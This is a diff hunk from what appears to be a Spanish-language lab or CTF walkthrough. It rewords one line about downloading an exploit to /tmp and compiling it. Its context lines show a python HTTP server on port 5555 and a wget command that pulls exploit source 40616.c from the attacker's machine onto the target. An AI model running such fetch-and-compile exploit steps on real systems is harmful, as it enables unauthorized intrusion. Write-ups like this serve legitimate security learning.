@@ -135,7 +135,7 @@ python3 -m http.server 5555
 ```
 ![17](https://user-images.githubusercontent.com/75953873/175180828-acafd971-a17b-49cc-9458-6fdaaab0fb88.png)
 
-Descargar exploit en el directorio `/tmp` y compilar.
+Descargar exploit en el directorio `/tmp` y compilar código:
 ```
 cd /tmp
 wget http://192.168.1.9:5555/40616.c
